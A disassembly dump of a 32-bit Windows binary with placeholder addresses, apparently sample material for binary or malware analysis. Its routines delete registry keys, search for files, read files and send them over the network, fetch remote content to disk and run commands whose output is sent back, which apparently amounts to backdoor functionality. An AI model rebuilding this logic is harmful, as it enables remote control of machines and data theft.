mov esi [ RegEnumKeyA@IAT ]
push [ ebp - 0x4 ]
call esi
mov edi 0x103
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegDeleteKeyA@IAT ]
xor eax eax
lea eax [ ebp - 0x110 ]
push eax
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call sub_407657
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
inc [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call esi
jmp r-xdata
cmp eax edi
je r-xdata
sub_4076f5
sub esp 0x514
push ebx
push ebp
push esi
push edi
push [ esp + 0x528 ]
call _strdup
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x14 ]
push eax
push [ esp + 0x530 ]
call sub_407aa8
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edi [ lstrlenA@IAT ]
push esi
call edi
cmp eax 0x1
jle r-xdata
push rw-data
jmp r-xdata
mov edi 0x80000002
mov ebx 0x80000003
push esi
call edi
cmp [ eax + esi - 0x1 ] 0x5c
jne r-xdata
call _strdup
mov esi eax
push esi
call strlen
pop ecx
pop ecx
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
push esi
push [ esp + 0x18 ]
call sub_407657
add esp 0xc
cmp eax 0xffffffff
mov eax [ esp + 0x10 ]
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x20019
push 0x0
push esi
push [ esp + 0x20 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
mov eax [ esp + 0x10 ]
jne r-xdata
push esi
call edi
and [ eax + esi - 0x1 ] 0x0
mov [ rw-data ] eax
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x514
retn
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
push [ esp + 0x14 ]
push rw-data
cmp eax ebx
je r-xdata
push rw-data
cmp eax ebx
je r-xdata
push esi
push rw-data
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
mov esi ebp
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x80000000
je r-xdata
lea eax [ esp + 0x12c ]
push eax
call sprintf
lea eax [ esp + 0x130 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x14
cmp eax 0x80000000
je r-xdata
push rw-data
push esi
call sub_407be3
mov ebp eax
pop ecx
test ebp ebp
pop ecx
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x80000001
je r-xdata
cmp eax 0x80000001
je r-xdata
cmp eax 0x80000001
je r-xdata
cmp eax 0x80000001
je r-xdata
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000006
je r-xdata
cmp eax 0x80000006
je r-xdata
cmp eax 0x80000006
je r-xdata
cmp eax 0x80000006
je r-xdata
push eax
call [ RegCloseKey@IAT ]
push eax
call [ RegCloseKey@IAT ]
push eax
call [ RegCloseKey@IAT ]
push eax
call [ RegCloseKey@IAT ]
sub_4078c7
sub esp 0x414
push ebx
push ebp
push esi
mov esi [ esp + 0x424 ]
push edi
push esi
mov [ esp + 0x18 ] 0x20019
call _strdup
mov [ esp ] rw-data
push esi
mov [ esp + 0x24 ] eax
call sub_407be3
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x18 ]
push eax
push esi
call sub_407aa8
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
mov edi [ lstrlenA@IAT ]
push esi
call edi
cmp eax 0x1
jle r-xdata
push rw-data
jmp r-xdata
mov ebx 0x80000002
mov ebp 0x80000003
push esi
call edi
cmp [ eax + esi - 0x1 ] 0x5c
jne r-xdata
call _strdup
mov esi eax
push esi
call strlen
pop ecx
pop ecx
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x18 ]
push 0x0
push esi
push [ esp + 0x20 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
mov eax [ esp + 0x10 ]
jne r-xdata
mov [ esp + 0x14 ] 0x2001f
push esi
call edi
and [ eax + esi - 0x1 ] 0x0
mov [ rw-data ] eax
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x414
retn
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
push esi
push rw-data
jmp r-xdata
cmp eax ebp
je r-xdata
mov eax [ esp + 0x18 ]
mov esi edi
test edi edi
mov [ esp + 0x10 ] eax
jne r-xdata
cmp eax ebp
je r-xdata
lea eax [ esp + 0x2c ]
push eax
call sprintf
lea eax [ esp + 0x30 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x14
cmp eax 0x80000000
je r-xdata
push rw-data
push esi
call sub_407be3
mov edi eax
pop ecx
test edi edi
pop ecx
jne r-xdata
push [ esp + 0x20 ]
push eax
call [ RegDeleteValueA@IAT ]
test eax eax
mov eax [ esp + 0x10 ]
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x80000001
je r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp eax 0x80000001
je r-xdata
cmp eax 0x80000005
je r-xdata
push [ esp + 0x1c ]
push rw-data
cmp eax ebp
je r-xdata
push rw-data
cmp eax ebp
je r-xdata
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000006
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x80000006
je r-xdata
push eax
call [ RegCloseKey@IAT ]
cmp eax 0x80000001
je r-xdata
cmp eax 0x80000001
je r-xdata
push eax
call [ RegCloseKey@IAT ]
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000005
je r-xdata
cmp eax 0x80000006
je r-xdata
cmp eax 0x80000006
je r-xdata
push eax
call [ RegCloseKey@IAT ]
push eax
call [ RegCloseKey@IAT ]
sub_407aa8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x2
push rw-data
push edi
call strncmp
add esp 0xc
mov esi rw-data
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x1
push esi
push edi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
inc edi
inc edi
jmp r-xdata
push esi
push edi
call sub_407be3
mov esi [ lstrcmpiA@IAT ]
pop ecx
pop ecx
mov ebx eax
push rw-data
push edi
call esi
test eax eax
je r-xdata
inc edi
mov eax [ ebp + 0xc ]
mov [ eax ] 0x80000000
push rw-data
push edi
call esi
test eax eax
je r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x80000001
jmp r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
mov eax ebx
push rw-data
push edi
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x80000002
jmp r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x80000003
jmp r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x80000005
jmp r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x80000006
jmp r-xdata
push rw-data
push edi
call esi
test eax eax
je r-xdata
sub_407be3
mov eax [ esp + 0x4 ]
push esi
test eax eax
mov esi eax
je r-xdata
xor eax eax
pop esi
retn
mov al [ eax ]
test al al
je r-xdata
mov cl al
cmp [ eax ] 0x0
je r-xdata
mov edx esi
sub edx eax
push [ esp + 0xc ]
and [ esi ] 0x0
call strlen
pop ecx
add eax esi
pop esi
retn
mov cl [ esi + 0x1 ]
inc esi
test cl cl
jne r-xdata
cmp [ edx + eax ] cl
jne r-xdata
mov eax [ esp + 0xc ]
test cl cl
je r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
sub_407c54
push esi
mov esi rw-data
push esi
call strlen
cmp eax 0x5
pop ecx
jae r-xdata
push esi
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
push rw-data
push esi
call sprintf
pop ecx
pop ecx
sub_407c8c
push esi
push rw-data
mov [ rw-data ] 0x2
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_407cb4
push ebp
mov ebp esp
sub esp 0x80
push esi
lea eax [ ebp - 0x80 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x80 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x10
mov [ rw-data ] eax
mov eax esi
pop esi
leave
retn
sub_407cf2
push esi
push 0x4
push rw-data
push [ esp + 0x10 ]
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x5
push rw-data
push [ esp + 0x10 ]
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call _strdup
mov esi eax
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
pop ecx
push rw-data
call _strdup
pop ecx
mov esi eax
push rw-data
call _strdup
pop ecx
mov esi eax
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
mov [ rw-data ] eax
jmp r-xdata
sub_407d78
push ebp
mov ebp esp
sub esp 0x140
push ebx
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor ebx ebx
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov eax ebx
pop edi
pop ebx
leave
retn
push esi
mov esi [ FindNextFileA@IAT ]
push 0x1
lea eax [ ebp - 0x140 ]
pop ebx
push eax
push edi
push edi
call [ FindClose@IAT ]
pop esi
lea eax [ ebp - 0x140 ]
inc ebx
push eax
push edi
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_407dcd
push ebp
mov ebp esp
mov eax 0x13d4
call sub_418fe0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
cmp [ eax ] 0x0
je r-xdata
xor eax eax
push eax
call sub_40c987
mov esi eax
push esi
mov [ ebp - 0x4 ] esi
call sub_407d78
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
push esi
mov [ ebp - 0x8 ] eax
call strlen
pop ecx
push esi
lea eax [ ebp - 0x3d4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x3d4 ]
push eax
call _strdup
add esp 0x10
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
cmp [ eax + esi ] 0x5c
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebp + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x224 ]
mov edi rw-data
push eax
push esi
lea eax [ ebp - 0x110 ]
push edi
push eax
call sprintf
lea eax [ ebp - 0x110 ]
push eax
call sub_408003
mov ebx eax
push 0x6
mov esi rw-data
jmp r-xdata
and [ eax + esi ] 0x0
jmp r-xdata
push ebx
call strlen
mov [ rw-data ] eax
pop ecx
mov eax ebx
jmp r-xdata
push esi
call free
pop ecx
push esi
push ebx
call strncmp
add esp 0x20
test eax eax
jne r-xdata
dec eax
js r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
cmp [ ebp - 0xc ] 0x1
jle r-xdata
test ebx ebx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x13d4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x13d4 ]
push eax
call _strdup
add esp 0x10
mov esi eax
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push ebx
call free
pop ecx
mov esi [ ebp - 0x4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x224 ]
push eax
lea eax [ ebp - 0x110 ]
push [ ebp - 0x4 ]
push edi
push eax
call sprintf
lea eax [ ebp - 0x110 ]
push eax
call sub_408003
mov ebx eax
push 0x6
push ebx
call free
pop ecx
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
jmp r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push rw-data
call _strdup
pop ecx
mov ebx eax
push ebx
call free
pop ecx
sub_407f8e
push ebp
mov ebp esp
sub esp 0x100
push [ ebp + 0x8 ]
call atoi
test eax eax
pop ecx
jne r-xdata
mov ecx 0x400
cmp eax ecx
jle r-xdata
push [ rw-data ]
push rw-data
jmp r-xdata
push eax
mov [ rw-data ] eax
push rw-data
push ecx
mov [ rw-data ] ecx
push rw-data
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x100 ]
push esi
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
sub_408003
push ebp
mov ebp esp
sub esp 0x5ec
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x1
xor edi edi
cmp [ eax ] 0x0
pop esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0xc ] edi
je r-xdata
xor eax eax
push eax
call sub_40c987
mov [ esp ] rw-data
push eax
mov [ ebp - 0x4 ] eax
call fopen
pop ecx
cmp eax edi
pop ecx
mov [ ebp - 0x20 ] eax
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
push [ ebp - 0x4 ]
call _stat
pop ecx
cmp eax 0xffffffff
pop ecx
jne r-xdata
push rw-data
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
jmp r-xdata
push 0x5c
push [ ebp - 0x4 ]
call strrchr
inc eax
push eax
call _strdup
mov esi eax
push esi
mov [ ebp - 0x24 ] esi
call strlen
push eax
push esi
mov [ ebp - 0x18 ] eax
call sub_40267e
push [ ebp - 0x18 ]
push esi
call sub_40c768
add esp 0x20
cmp [ ebp - 0x40 ] edi
mov [ ebp - 0x1c ] eax
jbe r-xdata
push esi
call exit
cmp [ ebp - 0x4 ] edi
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x40 ]
push eax
push [ ebp - 0x4 ]
jne r-xdata
mov edi rw-data
cmp [ ebp - 0x1c ] edi
je r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push rw-data
push rw-data
jmp r-xdata
lea eax [ ebp - 0x68 ]
push 0xa
push eax
push [ ebp - 0xc ]
call _itoa
mov eax [ rw-data ]
shl eax 0xa
lea ebx [ eax + 0x1 ]
push ebx
call malloc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push [ ebp - 0x1c ]
call free
pop ecx
lea eax [ ebp - 0x1ec ]
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x1ec ]
push eax
call _strdup
mov esi eax
push esi
call strlen
push [ ebp - 0x20 ]
mov [ rw-data ] eax
call fclose
add esp 0xc
xor edi edi
push 0x1
call exit
push ebx
push 0x0
push esi
call memset
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x20 ]
call fseek
mov eax [ rw-data ]
push [ ebp - 0x20 ]
shl eax 0xa
push eax
push 0x1
push esi
call fread
push eax
push esi
mov [ rw-data ] eax
mov [ ebp - 0x28 ] eax
call sub_40267e
push [ rw-data ]
push esi
call sub_40c768
push esi
mov ebx eax
call free
push [ rw-data ]
call strlen
add esp 0x40
mov esi eax
push ebx
call strlen
push [ ebp - 0x1c ]
add esi eax
call strlen
push edi
add esi eax
call strlen
add esi eax
lea eax [ ebp - 0x68 ]
push eax
call strlen
lea esi [ esi + eax + 0x9 ]
push esi
call malloc
add esp 0x14
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
push [ ebp - 0x24 ]
push 0x1
call exit
push esi
push 0x0
push eax
call memset
lea eax [ ebp - 0x68 ]
push ebx
push eax
push [ ebp - 0x1c ]
push edi
push [ rw-data ]
push rw-data
push esi
push [ ebp - 0x8 ]
call _snprintf
add esp 0x2c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x10 ] 0x0
push ebx
call free
pop ecx
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xa
jl r-xdata
mov al [ esi ]
cmp al 0x30
jl r-xdata
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push [ ebp - 0x8 ]
push rw-data
call sub_402b19
mov esi eax
add esp 0x14
test esi esi
mov [ ebp - 0x14 ] esi
je r-xdata
push [ ebp - 0x8 ]
call free
cmp [ ebp - 0x10 ] 0xa
pop ecx
jge r-xdata
cmp al 0x39
jg r-xdata
push [ ebp - 0x40 ]
mov eax [ ebp - 0xc ]
xor edx edx
push eax
imul eax eax 0x64
div [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x1ec ]
push [ ebp - 0x4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x1ec ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
mov [ rw-data ] eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ebx rw-data
add esi eax
push ebx
push esi
call strstr
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
and [ ebp - 0xc ] 0x0
push rw-data
push esi
call strtok
push eax
call _strdup
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
push [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push ebx
call strlen
add esi eax
push 0x2
push rw-data
push esi
call strncmp
add esp 0x10
test eax eax
je r-xdata
push rw-data
call printf
pop ecx
push ebx
call atoi
push ebx
mov [ ebp - 0xc ] eax
call strlen
inc eax
push ebx
mov [ ebp - 0x18 ] eax
call free
add esp 0xc
jmp r-xdata
call free
pop ecx
mov eax [ ebp - 0xc ]
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0x30 ] eax
push [ ebp - 0x40 ]
fild [ ebp - 0x30 ]
push eax
push ecx
push ecx
lea eax [ ebp - 0x1ec ]
fmul [ r--data ]
fidiv [ ebp - 0x40 ]
fstp [ esp ]
push [ ebp - 0x4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x1ec ]
push eax
call strlen
mov esi eax
lea eax [ ebp - 0x1ec ]
push esi
push eax
call sub_40267e
lea eax [ ebp - 0x1ec ]
push esi
push eax
call sub_40c768
push [ rw-data ]
mov [ ebp - 0x10 ] eax
call strlen
push [ ebp - 0x10 ]
mov esi eax
call strlen
push edi
add esi eax
call strlen
lea esi [ esi + eax + 0x7 ]
push esi
call malloc
add esp 0x40
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call free
pop ecx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push esi
call free
pop ecx
cmp [ ebp - 0xc ] 0x0
ja r-xdata
push 0x1
call exit
push esi
push 0x0
push eax
call memset
push [ ebp - 0x10 ]
push edi
push [ rw-data ]
push rw-data
push esi
push [ ebp - 0x8 ]
call _snprintf
add esp 0x24
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x5ec ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x5ec ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x14
mov [ rw-data ] eax
jmp r-xdata
push [ ebp - 0x14 ]
call free
pop ecx
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push [ ebp - 0x8 ]
push rw-data
call sub_402b19
mov esi eax
add esp 0x14
test esi esi
mov [ ebp - 0x14 ] esi
je r-xdata
push [ ebp - 0x10 ]
call free
pop ecx
cmp [ rw-data ] 0xc8
jne r-xdata
push esi
call strlen
cmp eax 0xa
pop ecx
jbe r-xdata
push [ ebp - 0x8 ]
call free
mov eax [ ebp - 0xc ]
pop ecx
cmp eax [ ebp - 0x40 ]
jb r-xdata
push [ ebp - 0x14 ]
call free
pop ecx
push ebx
push esi
call strstr
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebx
call strlen
add esi eax
push 0x2
push rw-data
push esi
call strncmp
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
sub_408554
push ebp
mov ebp esp
sub esp 0x410
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
call strlen
mov esi eax
push edi
add esi edi
call strlen
pop ecx
pop ecx
inc ebx
push edi
dec esi
call strlen
cmp ebx eax
pop ecx
jbe r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
cmp [ esi ] 0x2f
jne r-xdata
jmp r-xdata
lea eax [ esi + 0x1 ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x410 ]
push eax
call _strdup
add esp 0x10
mov esi eax
jmp r-xdata
push eax
call _strdup
mov esi eax
push esi
call strlen
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push esi
call sub_40c89c
push [ ebp - 0x10 ]
mov esi eax
push esi
call sub_40267e
push esi
call sub_40c987
push rw-data
push eax
mov [ ebp - 0x4 ] eax
call fopen
add esp 0x24
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
push esi
call strlen
cmp [ ebp - 0x4 ] 0x0
pop ecx
mov [ rw-data ] eax
je r-xdata
push 0x7
push rw-data
push edi
mov [ ebp - 0x8 ] 0x50
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call free
pop ecx
push edi
call _strdup
mov edi eax
xor ebx ebx
pop ecx
mov esi edi
cmp [ edi ] bl
mov [ ebp - 0xc ] edi
je r-xdata
add edi 0x7
push 0x1
push [ ebp - 0x8 ]
push edi
push 0x0
push [ ebp - 0xc ]
call sub_402b19
add esp 0x14
mov esi eax
test edi edi
je r-xdata
cmp [ esi ] 0x2f
jne r-xdata
test esi esi
je r-xdata
push edi
call free
pop ecx
cmp [ esi ] 0x3a
jne r-xdata
test ebx ebx
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x410 ]
push eax
call _strdup
add esp 0x10
cmp [ rw-data ] 0xc8
jne r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
and [ esi ] 0x0
cmp [ esi + 0x1 ] 0x0
lea eax [ esi + 0x1 ]
je r-xdata
and [ esi ] bl
cmp [ esi + 0x1 ] bl
lea eax [ esi + 0x1 ]
je r-xdata
push esi
call free
pop ecx
push [ rw-data ]
push esi
call sub_40267e
push [ ebp + 0x8 ]
push [ rw-data ]
push 0x1
push esi
call fwrite
push [ ebp + 0x8 ]
call fclose
push esi
call free
push [ ebp - 0x4 ]
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x410 ]
push eax
call _strdup
add esp 0x30
jmp r-xdata
push eax
call atoi
pop ecx
mov [ ebp - 0x8 ] eax
push 0x1
pop ebx
mov [ ebp - 0xc ] eax
push [ ebp + 0x8 ]
mov esi eax
call fclose
pop ecx
sub_40874c
push ebp
mov ebp esp
mov eax 0x117c
call sub_418fe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov eax edi
cmp [ edi ] bl
mov esi edi
je r-xdata
mov al [ eax ]
mov [ esi ] al
mov esi 0x1000
push esi
lea eax [ ebp - 0x117c ]
push ebx
push eax
call memset
add esp 0xc
call sub_402650
test eax eax
push edi
je r-xdata
cmp [ eax ] 0x5c
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
mov cl [ eax ]
mov [ esi ] cl
inc esi
inc eax
cmp [ eax ] bl
jne r-xdata
cmp [ eax + 0x1 ] 0x22
lea ecx [ eax + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x78 ]
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4c ] 0x101
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x48 ] bx
push eax
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x117c ]
push [ rw-data ]
push ebx
push 0x10
push 0x1
pop esi
push esi
push ebx
push ebx
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x117c ]
push esi
push eax
call _snprintf
add esp 0x10
lea eax [ ebp - 0xc ]
push ebx
push rw-data
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov eax ecx
push 0x400
call malloc
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
push [ ebp - 0xc ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x8 ]
call esi
push edi
lea eax [ ebp - 0x117c ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x117c ]
push eax
call _strdup
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
add esp 0x14
mov eax esi
jmp r-xdata
mov [ rw-data ] ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ebx
call [ GetTickCount@IAT ]
mov [ ebp - 0x20 ] eax
push esi
call exit
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ rw-data ]
push 0x400
add eax edi
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x34 ]
mov esi 0x3ff
push ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
add eax edi
push esi
push eax
push [ ebp - 0x8 ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp - 0x10 ] ebx
je r-xdata
mov [ eax + edi ] bl
push [ ebp + 0x8 ]
lea eax [ ebp - 0x117c ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x117c ]
push eax
call _strdup
mov edi eax
push edi
call strlen
add esp 0x14
mov [ rw-data ] eax
jmp r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xf4240
jl r-xdata
lea eax [ ebp - 0x10 ]
push ebx
push eax
mov eax [ rw-data ]
add eax edi
push esi
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
mov eax [ rw-data ]
add eax [ ebp - 0x10 ]
mov [ rw-data ] eax
add eax 0x400
push eax
push edi
call realloc
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
push [ ebp - 0x2c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x30 ]
call esi
push [ ebp - 0xc ]
call esi
push [ ebp - 0x8 ]
call esi
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x30 ]
call [ GetExitCodeProcess@IAT ]
cmp [ ebp - 0x14 ] 0x103
jne r-xdata
cmp [ ebp - 0x14 ] 0x103
jne r-xdata
push 0x1
call exit
push [ rw-data ]
push [ ebp + 0x8 ]
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x20 ]
xor edx edx
mov ecx 0x3e8
div ecx
push eax
lea eax [ ebp - 0x17c ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x17c ]
push eax
call strlen
mov esi eax
lea eax [ ebp - 0x17c ]
push esi
push eax
call sub_40267e
lea eax [ ebp - 0x17c ]
push esi
push eax
call sub_40c768
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call strlen
push [ ebp - 0x4 ]
mov esi eax
call strlen
push rw-data
add esi eax
call strlen
push rw-data
add esi eax
call strlen
lea esi [ esi + eax + 0x6 ]
push esi
call malloc
add esp 0x3c
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push 0x1
call exit
push esi
push ebx
push eax
call memset
push [ ebp - 0x4 ]
push rw-data
push [ rw-data ]
push rw-data
push esi
push [ ebp - 0x18 ]
call _snprintf
add esp 0x24
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push [ ebp - 0x18 ]
push rw-data
call sub_402b19
push [ ebp - 0x18 ]
mov esi eax
mov [ ebp - 0x4 ] esi
call free
push esi
call strlen
add esp 0x1c
cmp eax 0xa
jbe r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
push rw-data
push esi
call strstr
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x4 ]
call free
pop ecx
jmp r-xdata
push rw-data
